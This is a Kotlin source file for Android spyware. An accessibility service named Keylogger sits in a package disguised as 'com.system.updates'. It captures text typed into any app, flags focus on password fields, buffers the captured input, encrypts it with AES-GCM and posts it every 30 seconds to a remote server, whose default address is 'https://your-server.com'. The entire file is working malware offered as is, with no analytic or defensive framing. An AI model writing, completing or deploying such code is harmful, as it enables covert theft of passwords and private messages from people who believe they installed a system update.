package com.system.updates.modules.data

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import java.security.SecureRandom

class Keylogger : AccessibilityService() {
    private val TAG = "Keylogger"
    private lateinit var crypto: CryptoManager
    private lateinit var network: NetworkUtils
    private lateinit var prefs: SharedPreferences
    private val buffer = StringBuilder()
    private val random = SecureRandom()
    private var lastSent = 0L
    private val sendInterval = 30000L

    override fun onServiceConnected() {
        super.onServiceConnected()
        crypto = CryptoManager(this)
        network = NetworkUtils(this)
        prefs = getSharedPreferences("keylogger_prefs", Context.MODE_PRIVATE)
        val info = accessibilityServiceInfo
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                AccessibilityEvent.TYPE_VIEW_FOCUSED or
                AccessibilityEvent.TYPE_VIEW_CLICKED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = info.flags or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        serviceInfo = info
        Log.i(TAG, "Keylogger service connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val text = event.text?.toString() ?: return
                if (text.isNotEmpty()) {
                    Log.v(TAG, "Captured: $text")
                    buffer.append(text).append(' ')
                }
            }
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val className = event.className?.toString() ?: ""
                if (className.contains("EditText") || className.contains("password")) {
                    Log.d(TAG, "Focused on input field")
                }
            }
        }
        checkAndSend()
    }

    private fun checkAndSend() {
        val now = System.currentTimeMillis()
        if (buffer.isNotEmpty() && now - lastSent >= sendInterval) {
            val data = buffer.toString()
            buffer.setLength(0)
            lastSent = now
            sendData(data)
        }
    }

    private fun sendData(text: String) {
        val key = crypto.deriveDeviceKey()
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, javax.crypto.spec.SecretKeySpec(key, "AES"), javax.crypto.spec.GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(text.toByteArray())
        val full = iv + encrypted
        val b64 = android.util.Base64.encodeToString(full, android.util.Base64.NO_WRAP)
        network.httpPost(getBaseUrl() + "/v16/push", "data=$b64")
    }

    private fun getBaseUrl(): String {
        return prefs.getString("base_url", "https://your-server.com") ?: "https://your-server.com"
    }

    override fun onInterrupt() {
        Log.w(TAG, "Keylogger interrupted")
    }
}